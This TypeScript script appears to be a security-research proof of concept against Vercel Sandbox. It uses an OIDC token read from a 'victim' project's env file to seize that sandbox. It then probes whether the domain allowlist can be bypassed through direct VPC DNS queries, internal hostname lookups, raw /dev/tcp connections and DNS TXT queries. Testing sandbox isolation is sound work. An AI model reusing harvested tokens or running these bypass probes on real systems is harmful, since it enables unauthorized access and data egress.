import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  console.log("policy before:", JSON.stringify(sbx.networkPolicy));
  console.log("setting domain allowlist: only example.com...");
  await sbx.updateNetworkPolicy({ allow: ["example.com"] });
  const res = await sbx.runCommand("bash", ["-c", `
set +e
echo "=== 1. DNS resolve ALLOWED domain example.com ==="
timeout 5 getent hosts example.com 2>&1 | head -2
echo "=== 2. DNS resolve NOT-ALLOWED domain github.com ==="
timeout 5 getent hosts github.com 2>&1 | head -2
echo "=== 3. direct dig to VPC 172.31.0.2 for github.com (not allowed) ==="
timeout 4 dig @172.31.0.2 github.com +time=3 +tries=1 2>&1 | tail -6
echo "=== 4. direct dig to VPC for internal ip-172-31-16-7.ec2.internal ==="
timeout 4 dig @172.31.0.2 ip-172-31-16-7.ec2.internal +time=3 +tries=1 2>&1 | tail -4
echo "=== 5. curl allowed domain ==="
timeout 4 curl -s -o /dev/null -w "example.com code=%{http_code}\\n" --max-time 3 http://example.com 2>&1 | tail -1
echo "=== 6. curl not-allowed domain (github.com) ==="
timeout 4 curl -s -o /dev/null -w "github.com code=%{http_code}\\n" --max-time 3 https://github.com 2>&1 | tail -1
echo "=== 7. raw TCP to github IP 140.82.112.4:443 ==="
timeout 2 bash -c "echo > /dev/tcp/140.82.112.4/443" 2>/dev/null && echo "github 443 OPEN" || echo "github 443 blocked"
echo "=== 8. DNS TXT lookup for arbitrary (not allowed) ==="
timeout 4 dig +short TXT o-o.myaddr.l.google.com @172.31.0.2 2>&1 | head -2
echo DONE
`], { wait: true, timeout: 90_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
